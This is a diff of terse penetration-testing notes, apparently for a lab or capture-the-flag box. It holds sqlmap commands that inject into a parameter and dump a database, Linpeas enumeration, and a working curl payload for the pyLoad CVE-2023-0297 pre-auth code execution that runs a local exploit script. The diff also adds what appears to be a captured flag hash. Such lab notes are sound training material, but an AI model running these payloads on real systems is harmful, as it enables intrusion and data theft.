@@ -10,19 +10,28 @@ https://github.com/fullstorydev/grpcui/tree/master
 
 grpcui -plaintext 10.10.11.214:50051
 
+open burpsuite
+
+python3 sqlmap.py -r burp.req -p id 
+python3 sqlmap.py -r burp.req -p id --dump
+
+
 
 Linpeas.sh
+https://github.com/carlospolop/PEASS-ng
+
+netstat -tupln
+
+
 https://www.rapid7.com/db/modules/exploit/linux/http/pyload_js2py_exec/
 
 
 https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad
 
-curl -i -s -k -X $'POST' \
-    --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/pwnd\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
-    $'http://<target>/flash/addcrypted2'
+curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"bash%20/tmp/exploit.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://127.0.0.1:8000/flash/addcrypted2'
 
 
-
+8038edc046b60dfb4b8669ae21d5b92d
 
 
 
